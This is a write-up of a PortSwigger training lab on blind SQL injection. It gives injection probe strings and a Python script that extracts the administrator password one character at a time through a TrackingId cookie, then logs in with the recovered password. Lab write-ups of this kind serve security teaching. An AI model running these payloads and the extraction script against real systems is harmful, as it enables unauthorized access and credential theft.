# [Lab:  Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.To solve the lab, log in as the administrator user.
>

## Step 1 : Check vul sql blind
```sql
' or 1=1-- -

' || (select '' from dual) || '  =>Oke        => Oracle database 

1' union select '1' from users where username='administrator'-- -
```
![check1](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check1.PNG)


## Step 2 : Check length password 
![check1](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check2.PNG)

=> Length of administrator password : 20 

## Step3 : Use the substring to find the first letter of password 
`SUBSTRING(string, start, length)`

`1. Create payload to check password `

```py
import string

chars = string.printable[:-6]
f = open('abc.txt',"w")

for c in chars:
	with open("abc.txt","a") as f :
		f.write(c + "\n")

```

`2. Use burp suite intruder `

![check](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check_3.png)

=> The first letter is 't'

## Step 4 : Code py to find full letter of password
```py
import string
import requests

url='https://acfb1fcd1f5d9cb4c0067543004e007f.web-security-academy.net/'
chars = string.printable[:-6]
#print(chars)
admin_pass=''
i=1
s=requests.Session()
s.get(url)

while True:
	for c in chars:
		payload = f"1' union select '1' from users where username='administrator' and substring(password,{i},1)='{c}'-- -"
		cookie1={"TrackingId":payload}
		r = requests.get(url,cookies=cookie1)
		print(c)
		if 'Welcome' in r.text :
			print('okeeeeeeeeeee')
			admin_pass+=c 
			i+=1
			print(admin_pass)
			break
		if(i==21):
			exit()

```

![check4](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check4.PNG)

=> Pass : `tdbnwdqkghsguyxqkywa`

## Step 5 : login user : `administrator` with password : `tdbnwdqkghsguyxqkywa`
![ok](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/oke.PNG)





